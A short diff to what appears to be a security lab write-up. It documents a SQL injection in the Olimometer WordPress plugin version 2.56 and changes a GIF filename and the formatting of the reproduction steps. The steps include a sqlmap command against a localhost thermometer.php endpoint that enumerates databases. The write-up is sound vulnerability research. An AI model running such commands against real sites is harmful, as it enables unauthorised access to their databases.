@@ -42,11 +42,11 @@ Time spent: **10** hours spent in total
     - Vulnerability types: SQL Injection
     - Tested in version: 2.56
     - Fixed in version: ***Not Fixed as of currently***
-  - [x] GIF Walkthrough: <img src="SQL_injection.gif">
+  - [x] GIF Walkthrough: <img src="SQL_Injection.gif">
   - [x] Steps to recreate: 
 	1. Download **Olimometer Plugin** for Word Press
-	2. Run SQL map with this command
-		-```sqlmap -u http://localhost:8080/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast```
+	2. Run SQL map with this command:
+		- ```sqlmap -u http://localhost:8080/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast```
 	3. It should dumb two databases ```exampldb``` and ```information_schema```
 
 ## Resources
